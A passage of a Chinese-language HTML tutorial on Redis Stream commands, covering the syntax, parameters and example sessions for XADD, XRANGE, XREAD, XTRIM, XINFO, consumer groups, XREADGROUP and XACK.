<td style="text-align:left"><a href="#STREAM_XGROUP_SETID">XGROUP SETID</a></td>
<td><strong>XGROUP SETID</strong> key groupname <font color="blue"> &lt;<strong>id |$</strong> &gt; </font> [ENTRIESREAD entries_read]</td>
<td>改</td>
<td style="text-align:left">修改消费者组的最后一个交付ID</td>
</tr>
<tr>
<td style="text-align:left"><a href="#STREAM_XREADGROUP">XREADGROUP</a></td>
<td><strong>XREADGROUP</strong> <strong>GROUP</strong> group consumer [<strong>COUNT</strong> count] <font color="blue"> [<strong>BLOCK</strong> milliseconds]</font>  [<strong>NOACK</strong>] <strong>STREAMS</strong> key [key …] <font color="orange">id [id …]</font></td>
<td>查/改</td>
<td style="text-align:left">从消费者组返回新条目，或者访问给定消费者的待处理条目的历史记录</td>
</tr>
<tr>
<td style="text-align:left"><a href="#STREAM_XPENDING">XPENDING</a></td>
<td><strong>XPENDING</strong> key group [<font color="blue">[IDLE min-idle-time] start end count [consumer]</font>]</td>
<td>查</td>
<td style="text-align:left">从消费者组<code>PEL</code>中 返回获取了但从未确认的消息信息和条目</td>
</tr>
<tr>
<td style="text-align:left"><a href="#STREAM_XCLAIM">XCLAIM</a></td>
<td><strong>XCLAIM</strong>  key group consumer  min-idle-time id [id …] [<strong>IDLE</strong> ms]   [<strong>TIME</strong> unix-time-milliseconds] [<strong>RETRYCOUNT</strong> count] [<strong>FORCE</strong>] [<strong>JUSTID</strong>]   [<strong>LASTID</strong> id]</td>
<td></td>
<td style="text-align:left">更改(或获得)使用者组中消息的所有权，就像消息已交付给指定的使用者一样。</td>
</tr>
<tr>
<td style="text-align:left"><a href="#STREAM_XAUTOCLAIM">XAUTOCLAIM</a></td>
<td></td>
<td></td>
<td style="text-align:left">更改(或获取)使用者组中消息的所有权，就像将消息交付给指定的使用者一样。</td>
</tr>
<tr>
<td style="text-align:left"><a href="#STREAM_XACK">XACK</a></td>
<td><strong>XACK</strong> key group id [id …]</td>
<td></td>
<td style="text-align:left">将挂起的消息标记为正确处理，有效地将其从使用者组的挂起条目列表中删除。该命令的返回值是成功确认的消息的数量，也就是说，我们实际上能够在PEL中解析的id。</td>
</tr>
</tbody>
</table>
<h2 id="span-id-STREAM-XADD-XADD-span"><span id="STREAM_XADD">XADD</span></h2>
<ul>
<li>
<p>命令详情</p>
<p>XADD key <font color="green"> [<strong>NOMKSTREAM</strong>]</font> <font color="blue"> [&lt;<strong>MAXLEN</strong> | <strong>MINID</strong>&gt; [= | ~] threshold [<strong>LIMIT</strong> <em>count</em>]] </font>  <font color="orange">&lt;* | id&gt;</font>  <em>field value [field value …]</em></p>
</li>
<li>
<p>命令参数解释</p>
<ol>
<li>
<p>可以使用 <code>NOMKSTREAM </code>选项禁用 <em>Stream key</em> 的创建（key不存在时，返回null）</p>
</li>
<li>
<p><font color="orange">&lt;* | id&gt;</font>  id组成方式：<code>&lt;millisecondsTime&gt;-&lt;sequenceNumber&gt;</code></p>
<ul>
<li>
<p>如果指定的 ID 参数是 <code>*</code>字符，XADD 命令将为您自动生成唯一 ID</p>
<p><code>XADD stream:test:1 * ip 127.0.0.1</code></p>
</li>
<li>
<p>虽然仅在极少数情况下有用，但可以指定格式良好的 ID，以便将使用指定的 ID 精确添加新条目。</p>
<p><code>XADD stream:test:1 1662020231547-1 ip 127.0.0.2</code></p>
<p>当用户为 指定显式 ID 时<code>XADD</code>，最小有效 ID 为 <code>0-1</code>，并且用户<em>必须</em>指定一个大于当前流内任何其他 ID 的 ID，否则该命令将失败并返回错误。</p>
<p>通常，仅当您有另一个系统生成唯一 ID（例如 SQL 表）并且您确实希望 Redis 流 ID 与另一个系统匹配时，才使用特定 ID。</p>
</li>
</ul>
</li>
<li>
<p><font color="blue">[&lt;<strong>MAXLEN</strong> | <strong>MINID</strong>&gt; [= | ~] threshold<br>
[<strong>LIMIT</strong> count]]</font>    封顶（Capped streams）</p>
<p><code>MAXLEN</code>：使用 MAXLEN，当达到指定长度时，旧条目会被自动驱逐</p>
<p><code>~</code>：表示封顶的阈值 count是一个近似值。<code>MAXLEN ~ 1000</code>我真的不需要这正好是 1000 个项目。它可以是 1000 或 1010 或 1030，只要确保至少保存 1000 个项目即可（常用场景）</p>
<p><code>MINID</code>：驱逐 ID 低于阈值的条目，其中阈值是流 ID</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> XADD mystream <span class="token number">1526919030474</span>-55 message <span class="token string">"Hello,"</span> 
<span class="token operator">&gt;</span> XADD mystream <span class="token number">1526919030474</span>-* message <span class="token string">" World!"</span>
<span class="token operator">&gt;</span> XADD mystream MAXLEN ~ <span class="token number">1000</span> * <span class="token punctuation">..</span>. entry fields here <span class="token punctuation">..</span>.
<span class="token operator">&gt;</span> XADD stest MINID <span class="token operator">=</span> <span class="token number">1670928883730</span>-0 * name zs age <span class="token number">12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ol>
</li>
<li>
<p>版本变更</p>
<p>版本6.2.0 前：<strong>XADD</strong> key <strong>ID</strong> <em>field string [field string …]</em></p>
<p>版本6.2.0后 ：添加了 **NOMKSTREAM 、MINID、  LIMIT **</p>
<p>版本7.0.0 ： 添加了对 显式 ID 形式的支持</p>
</li>
</ul>
<h2 id="span-id-STREAM-XRANGE-XRANGE-span"><span id="STREAM_XRANGE">XRANGE</span></h2>
<ul>
<li>
<p>详细命令</p>
<p><strong>XRANGE</strong> key <font color="blue">startId endId</font> <font color="orange">[COUNT count]</font></p>
</li>
<li>
<p>命令参数解释</p>
<ol>
<li>
<p><font style="color:blue;font-weight:bold">startId endId</font>:  startId 和 endId 之间为闭区间</p>
<ul>
<li>
<p>-和 + 特殊 ID 分别表示流中可能的最小 ID 和可能的最大 ID，因此以下命令将仅返回流中的所有条目：<code>XRANGE somestream - +</code></p>
<p><code>-</code>: 可以理解为：0-0</p>
<p><code>+</code>: 可以理解为：18446744073709551615-18446744073709551615</p>
</li>
<li>
<p>Incomplete IDs</p>
<p>不完整指定的ID：仅仅指定 UNIX 时间部分：<code>XRANGE somestream 1526985054069 1526985055069</code></p>
<p>在这种情况下，XRANGE 将使用 -0 自动完成开始间隔，使用 -18446744073709551615 自动完成结束间隔，以便返回在给定毫秒和另一个指定毫秒结束之间生成的所有条目。</p>
<p>这也意味着<strong>重复相同的毫秒两次，我们得到指定毫秒内的所有条目</strong></p>
<p>以这种方式使用 XRANGE 作为范围查询命令来获取指定时间内的条目。这对于获取一段时间内的操作历史，非常方便。</p>
</li>
<li>
<p>Exclusive ranges</p>
<p>开区间范围查询：ID 前加上字符<code>(</code>来指定一个开区间：<code>XRANGE somestream (1526985685298-0 + COUNT 2</code></p>
</li>
</ul>
</li>
<li>
<p><font color="orange">[<strong>COUNT</strong> count]</font> : 返回结果的前count条entry</p>
</li>
</ol>
</li>
<li>
<p>使用场景介绍</p>
<ol>
<li>
<p>stream 迭代</p>
<p>a. 上次查询的entry的id 用 开区间 <code>(</code>，作为下次查询的start 。</p>
<p>b. 我们可以从任何 ID 开始迭代（指定一个不完整的start id）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> XRANGE writers - + COUNT <span class="token number">2</span>
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1526985676425</span>-0
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"name"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"Virginia"</span>
      <span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"surname"</span>
      <span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"Woolf"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1526985685298</span>-0
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"name"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"Jane"</span>
      <span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"surname"</span>
      <span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"Austen"</span>
<span class="token operator">&gt;</span> XRANGE writers <span class="token punctuation">(</span><span class="token number">1526985685298</span>-0 + COUNT <span class="token number">2</span>
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1526985691746</span>-0
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"name"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"Toni"</span>
      <span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"surname"</span>
      <span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"Morrison"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1526985712947</span>-0
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"name"</span>
    <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"Agatha"</span>
      <span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"surname"</span>
    <span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"Christie"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>获取单个项目</p>
<p>XRANGE 的参数中指定两次 ID：<code>XRANGE mystream 1526984818136-0 1526984818136-0</code></p>
</li>
</ol>
</li>
</ul>
<h2 id="span-id-STREAM-XREVRANGE-XREVRANGE-span"><span id="STREAM_XREVRANGE">XREVRANGE</span></h2>
<ul>
<li>
<p>详细命令</p>
<p>XREVRANGE key end start [COUNT count]</p>
</li>
<li>
<p>举例</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">XREVRANGE somestream + - COUNT <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ul>
<h2 id="span-id-STREAM-XREAD-XREAD-span"><span id="STREAM_XREAD">XREAD</span></h2>
<ul>
<li>
<p>命令详情</p>
<p><strong>XREAD</strong> [<strong>COUNT</strong> count] <font color="green">[<strong>BLOCK</strong> milliseconds]</font> <font color="blue"><strong>STREAMS</strong> key [key …] id<br>
[id …]</font></p>
</li>
<li>
<p>命令参数解释</p>
<p><strong>STREAMS</strong> key [key …] id [id …]：指定了一个键列表以及调用消费者已经为每个流看到的相应最大 ID，因此该命令将只向客户端提供 ID  <code>大于</code>我们指定的 ID 的消息。（不包含指定的ID）</p>
<p>[<strong>BLOCK</strong> milliseconds]：阻塞的毫秒数。若milliseconds 设置为0 ，则表示永远不会超时</p>
<p>[<strong>COUNT</strong> count]：限定调用将在每个流中最多返回count个元素</p>
</li>
<li>
<p>特殊的ID<code>$</code></p>
<p><strong>STREAMS</strong> $ :  意味着应该使用已经存储在流中的最大 ID 作为最后一个 ID。</p>
<p>当阻塞时，有时我们希望只接收从阻塞那一刻开始通过XADD添加到流中的条目。在这种情况下，我们对已经添加的条目的历史不感兴趣。</p>
<p>对于这个用例，我们必须检查流顶部元素的ID，并在XREAD命令行中使用这样的ID。这是不干净的，需要调用其他命令，所以可以使用特殊的 <code>$</code> 来通知流，我们只想要新的东西。</p>
<p><strong>仅在第一次调用 XREAD 时使用 $ ID 非常重要。之后迭代的ID应该是流中最后报告的ID，否则您可能会错过中间添加的所有条目。</strong></p>
<table>
<thead>
<tr>
<th>客户端A</th>
<th>客户端B</th>
<th>客户端C</th>
</tr>
</thead>
<tbody>
<tr>
<td>&gt; XREAD COUNT 1 block 30000 STREAMS test $</td>
<td>&gt; XREAD COUNT 1 block 30000 STREAMS test $</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td>&gt; xadd test * name wangwu age 22<br>1675666852907-0</td>
</tr>
<tr>
<td>test<br>1675666852907-0<br>name<br>wangwu<br>age<br>22</td>
<td>test<br>1675666852907-0<br>name<br>wangwu<br>age<br>22</td>
<td></td>
</tr>
</tbody>
</table>
<blockquote>
<p>客户端C 发送消息时，阻塞等待的客户端A、客户端B 均接受到了流中新增条目</p>
</blockquote>
</li>
<li>
<p>使用场景</p>
<ol>
<li>
<p>非阻塞情况：从多个流读取数据（XRANGE 的扩展版本）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> XREAD COUNT <span class="token number">2</span> STREAMS mystream writers <span class="token number">0</span>-0 <span class="token number">0</span>-0
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"mystream"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1526984818136</span>-0
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"duration"</span>
            <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"1532"</span>
            <span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"event-id"</span>
            <span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"5"</span>
            <span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"user-id"</span>
            <span class="token number">6</span><span class="token punctuation">)</span> <span class="token string">"7782813"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1526999352406</span>-0
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"duration"</span>
            <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"812"</span>
            <span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"event-id"</span>
            <span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"9"</span>
            <span class="token number">5</span><span class="token punctuation">)</span> <span class="token string">"user-id"</span>
            <span class="token number">6</span><span class="token punctuation">)</span> <span class="token string">"388234"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"writers"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1526985676425</span>-0
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"name"</span>
            <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"Virginia"</span>
            <span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"surname"</span>
            <span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"Woolf"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1526985685298</span>-0
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"name"</span>
            <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"Jane"</span>
            <span class="token number">3</span><span class="token punctuation">)</span> <span class="token string">"surname"</span>
            <span class="token number">4</span><span class="token punctuation">)</span> <span class="token string">"Austen"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>阻塞情况下：（无返回数据的情况下，等待数据返回）</p>
<p>消费者第一次迭代：从我们开始收听的时间开始，阻塞等待最新消息</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> XREAD BLOCK <span class="token number">5000</span> COUNT <span class="token number">100</span> STREAMS mystream $<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>一旦我们得到一些回复，下一次调用将是这样的：阻塞等待<code>1526999644174-3</code>之后的数据</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> XREAD BLOCK <span class="token number">5000</span> COUNT <span class="token number">100</span> STREAMS mystream <span class="token number">1526999644174</span>-3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
</li>
<li>
<p>如何为单个流上被阻止的多个客户端提供服务：<strong>FIFO</strong></p>
<ol>
<li>
<p>当新项目可用时，为给定流阻塞的第一个客户端将是第一个被解除阻塞的客户端。因为从等待数据的客户端的角度来看，阻塞流读取是公平的，其语义是 FIFO 风格。（类似于阻塞队列）</p>
</li>
<li>
<p>为客户端提供服务时，不会从流中删除流条目，因此只要 XADD 命令向流提供数据，就会为每个等待的客户端提供服务。（不同于阻塞队列）</p>
</li>
</ol>
</li>
</ul>
<h2 id="span-id-STREAM-XTRIM-XTRIM-span"><span id="STREAM_XTRIM"> XTRIM</span></h2>
<ul>
<li>
<p>命令详情</p>
<p><strong>XTRIM</strong> <em>key</em> &lt;MAXLEN | MINID&gt; [= | ~] threshold [LIMIT count]</p>
</li>
<li>
<p>命令参数解释</p>
<p>MAXLEN:  只要流的长度超过指定的阈值，就逐出条目，其中阈值是一个正整数。</p>
<p>MINID: 驱逐 ID 低于阈值的条目，其中阈值是流 ID。</p>
</li>
<li>
<p>返回：成功移除数据量</p>
</li>
<li>
<p>示范</p>
<ol>
<li>
<p>精确修剪<code>=</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">XTRIM mystream MAXLEN <span class="token number">1000</span>
XTRIM mystream MINID <span class="token number">649085820</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
</li>
<li>
<p>近乎精确的修剪</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">XTRIM mystream MAXLEN ~ <span class="token number">1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ol>
</li>
</ul>
<h2 id="span-id-STREAM-XINFO-XINFO-span"><span id="STREAM_XINFO"> XINFO</span></h2>
<h3 id="XINFO-STREAM">XINFO STREAM</h3>
<ul>
<li>
<p>命令详情</p>
<p><strong>XINFO STREAM</strong> key [FULL [COUNT count]]：</p>
</li>
<li>
<p>此命令返回有关存储在 <key> 中的流的信息。详细信息是：</key></p>
<ul>
<li><strong>length</strong>: 流中的条目数</li>
<li><strong>radix-tree-keys</strong>: 底层基数数据结构中的键数</li>
<li><strong>radix-tree-nodes</strong>: 底层基数数据结构中的节点数</li>
<li><strong>groups</strong>: 底层基数数据结构中的节点数 groups：为流定义的消费者组数</li>
<li><strong>last-generated-id</strong>:添加到流中的最近条目的 ID</li>
<li><strong>max-deleted-entry-id</strong>: 从流中删除的最大条目 ID</li>
<li><strong>entries-added</strong>: 在其生命周期内添加到流中的所有条目的计数</li>
<li><strong>first-entry</strong>: 流中第一个条目的 ID 和字段值元组</li>
<li><strong>last-entry</strong>: 流中最后一个条目的 ID 和字段值元组</li>
</ul>
</li>
</ul>
<h3 id="XINFO-GROUPS">XINFO GROUPS</h3>
<ul>
<li>
<p>命令详情</p>
<p>XINFO GROUPS key</p>
</li>
</ul>
<h3 id="XINFO-CONSUMERS">XINFO CONSUMERS</h3>
<ul>
<li>
<p>命令详情</p>
<p>XINFO CONSUMERS key groupname</p>
</li>
</ul>
<h2 id="span-id-STREAM-GROUP-XGROUP-span"><span id="STREAM_GROUP"> XGROUP</span></h2>
<ul>
<li>
<p><strong>XGROUP</strong> 用于创建、销毁和管理消费者组。</p>
</li>
<li>
<p><strong>XREADGROUP</strong> 用于通过消费者组从流中读取。</p>
</li>
<li>
<p><strong>XACK</strong> 是允许消费者将未决消息标记为已正确处理的命令。</p>
</li>
</ul>
<h3 id="span-id-STREAM-XGROUP-CREATE-XGROUP-CREATE-span"><span id="STREAM_XGROUP_CREATE"> XGROUP CREATE</span></h3>
<ul>
<li>
<p>命令详情</p>
<p><strong>XGROUP CREATE</strong> key groupname  <font color="blue"> &lt;<strong>id | $</strong> &gt; </font>  <font color="green">[<strong>MKSTREAM</strong>]</font>  <strong>[ENTRIESREAD entries_read]</strong></p>
</li>
<li>
<p>参数说明</p>
<ol>
<li>
<p><font color="blue"> &lt;<strong>id | $</strong> &gt; </font> ：从新组的角度指定流中最后传送的条目。</p>
<p>例如，如果您希望组的消费者从头开始获取整个流，使用零作为消费者组的起始 ID。特殊 ID <code>$</code> 是指流中最后一个条目的 ID</p>
</li>
<li>
<p><font color="green">[<strong>MKSTREAM</strong>]</font>: 流不存在时，自动创建，否则返回 key不存在的异常</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ERR The XGROUP subcommand requires the key to exist. Note that <span class="token keyword">for</span> CREATE you may want to use the MKSTREAM option to create an empty stream automatically.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
<li>
<p><strong>[ENTRIESREAD entries_read]</strong></p>
<p>从 指定的 <font color="blue"> &lt;<strong>id | $</strong> &gt;</font>，到最后一个条目，指定读取的条目容量</p>
</li>
</ol>
</li>
<li>
<p>功能说明</p>
<p>创建消费者组</p>
</li>
</ul>
<h3 id="span-id-STREAM-XGROUP-CREATECONSUMER-XGROUP-CREATECONSUMER-span"><span id="STREAM_XGROUP_CREATECONSUMER">XGROUP CREATECONSUMER</span></h3>
<ul>
<li>
<p>命令详情</p>
<p><strong>XGROUP CREATECONSUMER</strong> key groupname consumername</p>
</li>
<li>
<p>功能说明</p>
<p>在消费者组中创建消费者</p>
</li>
</ul>
<h3 id="span-id-STREAM-XGROUP-DELCONSUMER-XGROUP-DELCONSUMER-span"><span id="STREAM_XGROUP_DELCONSUMER">XGROUP DELCONSUMER</span></h3>
<ul>
<li>
<p>命令详情</p>
<p><strong>XGROUP DELCONSUMER</strong> key groupname consumername</p>
</li>
<li>
<p>功能说明</p>
<p>在消费者组中删除消费者。消费者拥有的任何待处理消息在被删除后将变得不可领取。因此，强烈建议在从组中删除消费者之前声明或确认任何未决消息。</p>
</li>
</ul>
<h3 id="span-id-STREAM-XGROUP-DESTROY-XGROUP-DESTROY-span"><span id="STREAM_XGROUP_DESTROY">XGROUP DESTROY</span></h3>
<ul>
<li>
<p>命令详情</p>
<p><strong>XGROUP DESTROY</strong> key groupname</p>
</li>
<li>
<p>功能说明</p>
<p>摧毁一个消费者组。即使有活跃的消费者和待处理的消息，消费者组也会被销毁，因此请确保仅在真正需要时才调用此命令。</p>
</li>
</ul>
<h3 id="span-id-STREAM-XGROUP-SETID-XGROUP-SETID-span"><span id="STREAM_XGROUP_SETID">XGROUP SETID</span></h3>
<ul>
<li>
<p>命令详情</p>
<p><strong>XGROUP SETID</strong> key groupname  <font color="blue"> &lt;<strong>id | $</strong> &gt; </font>  [ENTRIESREAD entries_read]</p>
</li>
<li>
<p>功能说明</p>
<p><strong>XGROUP SETID</strong>命令允许修改组的最后一个交付ID，而不必删除和重新创建组。例如，如果你想让消费者组中的消费者重新处理流中的所有消息，你可以将其下一个ID设置为0</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">XGROUP SETID mystream mygroup <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
</li>
</ul>
<h3 id="span-id-STREAM-XREADGROUP-XREADGROUP-span"><span id="STREAM_XREADGROUP">XREADGROUP</span></h3>
<ul>
<li>
<p>命令详情</p>
<p><strong>XREADGROUP</strong> <strong>GROUP</strong> group consumer [<strong>COUNT</strong> count] <font color="blue"> [<strong>BLOCK</strong> milliseconds]</font>  [<strong>NOACK</strong>] <strong>STREAMS</strong> key [key …] <font color="orange">id [id …]</font></p>
</li>
<li>
<p>参数说明</p>
<p><font color="orange">id [id …]</font>：</p>
<ul>
<li>若id为 <code>&gt;</code> :  使用者只想接收从未传递给任何其他使用者的消息</li>
<li>任何其他ID，即 <code>0</code> 或任何其他有效ID或不完整ID（仅为毫秒时间部分），客户端访问的是：传递给它但尚未确认的消息（历史记录的概念）。注意，在这种情况下，BLOCK和NOACK都被忽略。</li>
</ul>
</li>
<li>
<p>功能说明</p>
<p>使用 <code>XREADGROUP </code> 可以创建<strong>客户端组</strong>来消费到达给定流的消息的不同部分。例如，如果流获得新的条目 A、B 和 C，并且有两个消费者通过消费者组读取消息，一个客户端将获得消息 A 和 C，另一个客户端将获得消息 B。</p>
<p>但是要实现多个键中读取，您需要在每个流中创建一个具有相同名称的消费者组（不常见的需求）</p>
</li>
<li>
<p>举例</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&gt;</span> XGROUP CREATE mystream mygroup $ MKSTREAM
<span class="token operator">&gt;</span> XADD mystream * message apple
<span class="token operator">&gt;</span> XADD mystream * message orange
<span class="token operator">&gt;</span> XADD mystream * message strawberry
<span class="token operator">&gt;</span> XADD mystream * message apricot


<span class="token operator">&gt;</span> XRANGE mystream - +
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1675738497958-0"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"message"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"apple"</span>
<span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1675738498027-0"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"message"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"orange"</span>
<span class="token number">3</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1675738498119-0"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"message"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"strawberry"</span>
<span class="token number">4</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1675738498206-0"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"message"</span>
      <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"apricot"</span>
      
      
<span class="token operator">&gt;</span> XREADGROUP GROUP mygroup Alice STREAMS mystream <span class="token number">0</span>
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"mystream"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>empty array<span class="token punctuation">)</span>

<span class="token operator">&gt;</span> XADD mystream * message banana
<span class="token string">"1675738604129-0"</span>

<span class="token comment">## 接收条目</span>
<span class="token operator">&gt;</span> XREADGROUP GROUP mygroup Alice COUNT <span class="token number">1</span> STREAMS mystream <span class="token operator">&gt;</span>
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"mystream"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1675738667048-0"</span>
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"message"</span>
            <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"apple"</span>
         
<span class="token comment">## 已接收但是未确认的历史消息列表</span>
<span class="token operator">&gt;</span> XREADGROUP GROUP mygroup Alice STREAMS mystream <span class="token number">0</span>
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"mystream"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"1675738667048-0"</span>
         <span class="token number">2</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"message"</span>
            <span class="token number">2</span><span class="token punctuation">)</span> <span class="token string">"apple"</span>
        
<span class="token comment">## 确认消息</span>
<span class="token operator">&gt;</span> XACK mystream mygroup <span class="token number">1675738667048</span>-0
<span class="token punctuation">(</span>integer<span class="token punctuation">)</span> <span class="token number">1</span>

<span class="token comment">## 已接收但是未确认的历史消息列表</span>
<span class="token operator">&gt;</span> XREADGROUP GROUP mygroup Alice STREAMS mystream <span class="token number">0</span>
<span class="token number">1</span><span class="token punctuation">)</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token string">"mystream"</span>
   <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>empty array<span class="token punctuation">)</span>
   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<h3 id="span-id-STREAM-XACK-XACK-span"><span id="STREAM_XACK"> XACK</span></h3>
<ul>
<li>
<p>命令详情</p>
<p><strong>XACK</strong> key group id [id …]</p>
</li>
<li>
<p>功能说明</p>
<p><code>XACK</code>命令从流使用者组的<code>Pending Entries List (PEL)</code>中删除一条或多条消息。</p>
